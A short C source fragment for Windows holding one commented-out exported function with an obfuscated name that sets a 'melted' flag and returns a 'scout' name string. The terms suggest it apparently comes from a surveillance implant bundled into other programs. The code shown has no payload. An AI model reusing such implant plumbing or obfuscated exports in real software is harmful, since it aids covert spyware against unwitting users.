#include <windows.h>
#include "binpatch.h"
#include "globals.h"
#include "debug.h"

/*
__declspec(dllexport) LPWSTR olaa4iwjslkl(PULONG pSynchro) // questa viene richiamata dai meltati
{
#ifdef _DEBUG
	OutputDebug(L"[+] Setting bMelted to TRUE\n");
#endif
	
	LPWSTR pScoutName;
	
	bMelted = TRUE;
	uSynchro = pSynchro;

	pScoutName = (LPWSTR)VirtualAlloc(NULL, strlen(SCOUT_NAME)*sizeof(WCHAR)*2, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, SCOUT_NAME, strlen(SCOUT_NAME), pScoutName, strlen(SCOUT_NAME) + 2);

	return pScoutName;
}
*/